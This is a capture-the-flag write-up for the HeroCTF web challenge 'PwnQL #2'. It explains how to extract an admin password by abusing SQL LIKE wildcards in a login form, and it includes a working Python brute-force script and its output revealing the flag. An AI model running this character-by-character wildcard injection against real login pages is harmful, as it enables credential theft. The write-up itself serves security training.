# PwnQL #2

### Category

Web

### Description

Extract the *admin*'s password from the database.

URL : http://chall2.heroctf.fr:8080 (same URL than before)

Format : **Hero{password}**<br>
Author : **xanhacks**

### Write up

So, here we are with the same vulnerability that the first PwnQL, but we need to extract the admin's password.

The goal here is to find the password according to the server response.

```
Example :

password : a% -> login error
password : b% -> login error
password : c% -> login error
password : d% -> login success

The admin's password starts with the letter 'd'.
```

Let's make a python to script which do the job for us.

```python
#!/usr/bin/env python3
from string import printable
from requests import post

URL = "http://challs.heroctf.fr:8080/index.php"

charset = printable.replace("_", "").replace("%", "")

print("flag : ", end="", flush=True)
flag = ""
for _ in range(32):
    for char in charset:
        data = {
            "username": "admin",
            "password": flag + char.strip() + "%"
        }

        req = post(URL, data=data)
    
        if "flag" in req.text:
            print(char, end="", flush=True)
            flag += char
            break
```

Execution :

```shell
$ python3 solve.py
flag : s3cur3p@ss
```

### Flag

Hero{s3cur3p@ss}